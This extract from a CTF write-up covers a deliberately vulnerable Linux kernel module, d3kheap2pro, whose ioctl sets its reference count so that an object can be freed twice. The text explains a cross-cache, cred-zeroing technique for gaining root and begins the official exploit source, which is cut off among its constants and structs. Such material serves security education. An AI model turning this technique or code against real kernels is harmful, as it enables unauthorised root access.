---
来源: https://github.com/D-3CTF/D3CTF-2026-Official-Writeup (EN PDF pp.52-59, jsdelivr 镜像下载)
类型: raw
获取日期: 2026-09-12
---


===== PAGE 52 =====
+     * Test range containment without evaluating an unsigned subtraction​
+     * until its subtrahend has been proved to fit.​
+     */​
 #ifdef CONFIG_USER_ONLY​
-    assert(offset <= ac->size1 - len);​
+    assert(offset <= ac->size1 && len <= ac->size1 - offset);​
     return ac->haddr1 + offset;​
 #else​
-    if (likely(offset <= ac->size1 - len)) {​
+    if (likely(offset <= ac->size1 &&​
+               len <= ac->size1 - offset)) {​
         return ac->haddr1 + offset;​
     }​
-    assert(offset <= ac->size - len);​
+    assert(offset <= ac->size && len <= ac->size - offset);​
     /*​
      * If the address is not naturally aligned, it might span both pages.​
      * Only return ac->haddr2 if the area is entirely within the second page,​
      * otherwise fall back to slow accesses.​
      */​
     if (likely(offset >= ac->size1)) {​
+        if (unlikely(!ac->haddr2)) {​
+            return NULL;​
+        }​
         return ac->haddr2 + (offset - ac->size1);​
     }​
     return NULL;​
-- ​
2.47.3​
​
​
d3kbus-revenge​
The same challenge as d3kbus , which has patched unintended solutions.​
d3kheap2pro​
This challenge provides a loadable kernel module d3kheap2pro.ko , which has a double-free 
vulnerability in the  d3kheap2pro_ioctl() :​
Code block​
static long d3kheap2pro_ioctl(struct file*filp, unsigned int cmd, unsigned 
long arg)​
{​
    struct d3kheap2pro_ureq ureq;​
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
1
2
3

===== PAGE 53 =====
    long res = 0;​
​
    spin_lock(&d3kheap2pro_globl_lock);​
​
    if (copy_from_user(&ureq, (void*) arg, sizeof(ureq))) {​
        logger_error("Unable to copy request from userland!\n");​
        res = -EFAULT;​
        goto out;​
    }​
​
    if (ureq.idx >= D3KHEAP2PRO_BUF_NR) {​
        logger_error("Got invalid request from userland!\n");​
        res = -EINVAL;​
        goto out;​
    }​
​
    switch (cmd) {​
    case D3KHEAP2PRO_OBJ_ALLOC:​
        if (d3kheap2pro_bufs[ureq.idx].buffer) {​
            logger_error(​
                "Expected slot [%d] has already been occupied!\n",​
                ureq.idx​
            );​
            res = -EPERM;​
            break;​
        }​
​
        d3kheap2pro_bufs[ureq.idx].buffer = kmem_cache_alloc(​
            d3kheap2pro_cachep,​
            GFP_KERNEL | __GFP_ZERO​
        );​
        if (!d3kheap2pro_bufs[ureq.idx].buffer) {​
            logger_error("Failed to alloc new buffer on expected slot!\n");​
            res = -ENOMEM;​
            break;​
        }​
​
        /* vulnerability here */​
        atomic_set(&d3kheap2pro_bufs[ureq.idx].ref_count, 1);​
        atomic_inc(&d3kheap2pro_bufs[ureq.idx].ref_count);​
​
        logger_info(​
            "Successfully allocate new buffer for slot [%d].\n",​
            ureq.idx​
        );​
​
        break;​
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50

===== PAGE 54 =====
    case D3KHEAP2PRO_OBJ_FREE:​
        if (!d3kheap2pro_bufs[ureq.idx].buffer) {​
            logger_error(​
                "Expected slot [%d] had not been allocated!\n",​
                ureq.idx​
            );​
            res = -EPERM;​
            break;​
        }​
​
        if (atomic_read(&d3kheap2pro_bufs[ureq.idx].ref_count) <= 0) {​
            logger_error("You're not allowed to free a free slot!");​
            res = -EPERM;​
            break;​
        }​
​
        atomic_dec(&d3kheap2pro_bufs[ureq.idx].ref_count);​
        kmem_cache_free(d3kheap2pro_cachep, d3kheap2pro_bufs[ureq.idx].buffer);​
​
        logger_info(​
            "Successfully free existed buffer on slot [%d].\n",​
            ureq.idx​
        );​
​
        break;​
    case D3KHEAP2PRO_OBJ_EDIT:​
        logger_error(​
            "🕊🕊🕊 This function hadn't been completed yet bcuz I'm a 
pigeon!\n"​
        );​
        break;​
    case D3KHEAP2PRO_OBJ_SHOW:​
        logger_error(​
            "🕊🕊🕊 This function hadn't been completed yet bcuz I'm a 
pigeon!\n"​
        );​
        break;​
    default:​
        logger_error("Got invalid request from userland!\n");​
        res = -EINVAL;​
        break;​
    }​
​
out:​
    spin_unlock(&d3kheap2pro_globl_lock);​
​
    return res;​
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95

===== PAGE 55 =====
}​
Solution​
As no other functionalities were provided except for allocating and freeing kernel objects in an 
isolated kmem_cache , we had to do the cross-cache attack at the beginning. However, in 2026, 
as new memory allocating mechanisms like CPU sheaf had been introduced in the latest kernel, 
we need to consider about following points:​
•
CPU sheaf is in fact a fast cache layer living above the original SLUB, so we can fallback to the 
old layer by well-crafted allocating-freeing procedure​
•
The existence of the Per-CPU Page Set requires us to pay additional attention to page 
recycling between PCP and Buddy System​
•
INIT_ON_ALLOC is a double-edged sword: it prevents the old data from being leaked or to be 
reused, but also provides us with a hidden primitive of overwriting an object with zero. We 
abuse this feature to overwrite cred to get the root privilege, i.e., "your fix is my exploit" . 
We might not be the first one to disclose such double-edged-sword tricks, but we believe 
that the creation of such tricks will become a more popular trend in the future.​
•
As SYSCALLs like setresuid will examine fields like cred->user_ns that have been 
zeroed by us, a better way is to exploit those code paths like fchmodat2() that only 
checks fields like cred->fsuid .​
Finally, our official exp.c is as follows:​
Code block​
#if !defined(__x86_64__)​
# error "this freestanding solver currently supports x86_64 only"​
#endif​
​
#ifndef SOLVER_ROOT_SHELL​
#define SOLVER_ROOT_SHELL 0​
#endif​
​
/* Compiler-native types: no libc headers are required. */​
typedef __SIZE_TYPE__ size_t;​
typedef __UINTPTR_TYPE__ uintptr_t;​
typedef __INTPTR_TYPE__ intptr_t;​
typedef unsigned char u8;​
typedef unsigned int u32;​
typedef unsigned long u64;​
typedef int s32;​
typedef long s64;​
typedef u32 uid_t;​
96
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18

===== PAGE 56 =====
typedef void (*thread_fn)(void *);​
​
#define NULL ((void *)0)​
#define true 1​
#define false 0​
​
/* x86_64 syscall numbers. */​
#define NR_read                    0​
#define NR_write                   1​
#define NR_close                   3​
#define NR_fstat                   5​
#define NR_mmap                    9​
#define NR_ioctl                  16​
#define NR_clone                  56​
#define NR_fork                   57​
#define NR_execve                 59​
#define NR_exit                   60​
#define NR_fcntl                  72​
#define NR_fsync                  74​
#define NR_geteuid               107​
#define NR_setreuid              113​
#define NR_futex                 202​
#define NR_sched_setaffinity     203​
#define NR_sched_getaffinity     204​
#define NR_exit_group            231​
#define NR_openat                257​
#define NR_pipe2                 293​
#define NR_prlimit64             302​
#define NR_io_uring_setup        425​
#define NR_io_uring_register     427​
#define NR_fchmodat2             452​
#define NR_msgget                 68​
#define NR_msgsnd                 69​
#define NR_msgrcv                 70​
​
/* errno values used for diagnostics/control flow. */​
#define EIO        5​
#define EAGAIN    11​
#define EACCES    13​
#define EINVAL    22​
#define ENOSPC    28​
#define ENOSYS    38​
#define EPROTO    71​
#define EOVERFLOW 75​
#define EPERM      1​
​
/* File, VM, futex, IPC and clone constants. */​
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65

===== PAGE 57 =====
#define STDIN_FILENO   0​
#define STDOUT_FILENO  1​
#define STDERR_FILENO  2​
#define AT_FDCWD      (-100)​
#define AT_EMPTY_PATH  0x1000​
#define O_RDONLY       0​
#define O_WRONLY       1​
#define O_RDWR         2​
#define O_APPEND       02000​
#define O_CLOEXEC      02000000​
#define O_PATH         010000000​
#define F_SETPIPE_SZ   1031​
#define F_GETPIPE_SZ   1032​
#define PROT_READ      0x1​
#define PROT_WRITE     0x2​
#define MAP_PRIVATE    0x02​
#define MAP_ANONYMOUS  0x20​
#define MAP_STACK      0x20000​
#define IPC_PRIVATE    0​
#define IPC_CREAT      01000​
#define IPC_NOWAIT     04000​
#define MSG_NOERROR    010000​
#define FUTEX_WAIT_PRIVATE 128​
#define FUTEX_WAKE_PRIVATE 129​
#define CLONE_VM       0x00000100UL​
#define CLONE_FS       0x00000200UL​
#define CLONE_FILES    0x00000400UL​
#define CLONE_SIGHAND  0x00000800UL​
#define CLONE_THREAD   0x00010000UL​
#define CLONE_SYSVSEM  0x00040000UL​
#define THREAD_CLONE_FLAGS \​
    (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | \​
     CLONE_THREAD | CLONE_SYSVSEM)​
​
#define RLIMIT_NPROC    6​
#define RLIMIT_NOFILE   7​
#define RLIMIT_MEMLOCK  8​
#define RLIM_INFINITY (~0UL)​
​
#define IORING_REGISTER_PERSONALITY   9U​
#define IORING_UNREGISTER_PERSONALITY 10U​
​
#define S_ISUID 04000​
​
/* Challenge geometry. */​
#define d3kheap2pro_OBJ_ALLOC 0x3361626eUL​
#define d3kheap2pro_OBJ_FREE  0x74747261UL​
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112

===== PAGE 58 =====
#define d3kheap2pro_BUF_NR    0x200U​
#define SHEAF_CAP          12U​
#define BARN_SHEAF_NR      10U​
#define BARN_PTR_NR        (SHEAF_CAP * BARN_SHEAF_NR)​
#define OBJ_PER_SLAB       16U​
#define GROUP_OBJECT_NR    48U​
#define INITIAL_D3_NR      360U​
#define TARGET_PTR_NR      96U​
#define SAFE_PTR_NR        24U​
#define AUX_PTR_NR         72U​
#define PRE_PTR_NR         12U​
#define POST_PTR_NR        12U​
#define REMAINDER_PTR_NR   48U​
#define WING_PTR_NR        144U​
#define FILLER_PTR_NR      24U​
#define CACHED_DRAIN_NR    (FILLER_PTR_NR + BARN_PTR_NR)​
#define TARGET_SLAB_NR     6U​
#define TARGET_PAGE_NR     (TARGET_SLAB_NR * 8U)​
#define WING_SLAB_NR       9U​
​
#define PERSONALITY_POOL_NR 65535U​
#define CRED_WARMUP_NR       2048U​
#define CRED_SENTINEL_GAP     144U​
#define HELPER_TARGET_NR      128U​
#define HELPER_MIN_NR          80U​
#define HELPER_RLIMIT_RESERVE   8U​
#define CRED_SPRAY_MAX_NR (HELPER_TARGET_NR * CRED_SENTINEL_GAP)​
​
#define THREAD_STACK_SIZE (16UL * 1024UL)​
#define THREAD_SLOT_NR    (HELPER_TARGET_NR + 1U)​
#define THREAD_REGION_SIZE (THREAD_STACK_SIZE * THREAD_SLOT_NR)​
​
#define PIPE_TARGET_NR  48U​
#define PIPE_MIN_NR     32U​
#define PIPE_LARGE_SIZE (1U << 20)​
#define PIPE_PRIME_NR   96U​
#define GUARD_WARM_NR  384U​
#define CPU_WORD_NR      16U​
#define MAX_ALLOWED_CPU (CPU_WORD_NR * 8U * sizeof(unsigned long))​
#define INT_MAX_VALUE 0x7fffffff​
​
_Static_assert(TARGET_PTR_NR + SAFE_PTR_NR == BARN_PTR_NR,​
               "barn pointer count mismatch");​
_Static_assert(PRE_PTR_NR + POST_PTR_NR + REMAINDER_PTR_NR == AUX_PTR_NR,​
               "aux pointer count mismatch");​
_Static_assert(CRED_WARMUP_NR + CRED_SPRAY_MAX_NR < PERSONALITY_POOL_NR,​
               "personality cursor would wrap");​
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159

===== PAGE 59 =====
​
struct d3kheap2pro_ureq { size_t idx; };​
struct guard_message { long mtype; u8 byte; };​
struct pipe_booster { int read_fd; int write_fd; int small_size; };​
struct rlimit64 { u64 cur; u64 max; };​
​
struct io_sqring_offsets {​
    u32 head, tail, ring_mask, ring_entries;​
    u32 flags, dropped, array, resv1;​
    u64 user_addr;​
};​
struct io_cqring_offsets {​
    u32 head, tail, ring_mask, ring_entries;​
    u32 overflow, cqes, flags, resv1;​
    u64 user_addr;​
};​
struct io_uring_params {​
    u32 sq_entries, cq_entries, flags, sq_thread_cpu;​
    u32 sq_thread_idle, features, wq_fd, resv[3];​
    struct io_sqring_offsets sq_off;​
    struct io_cqring_offsets cq_off;​
};​
​
/* Native x86_64 kernel struct stat ABI. */​
struct kernel_stat {​
    u64 st_dev;​
    u64 st_ino;​
    u64 st_nlink;​
    u32 st_mode;​
    u32 st_uid;​
    u32 st_gid;​
    u32 pad0;​
    u64 st_rdev;​
    s64 st_size;​
    s64 st_blksize;​
    s64 st_blocks;​
    u64 st_atime;​
    u64 st_atime_nsec;​
    u64 st_mtime;​
    u64 st_mtime_nsec;​
    u64 st_ctime;​
    u64 st_ctime_nsec;​
    s64 unused[3];​
};​
​
struct d3_schedule {​
    u32 pre[PRE_PTR_NR];​
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
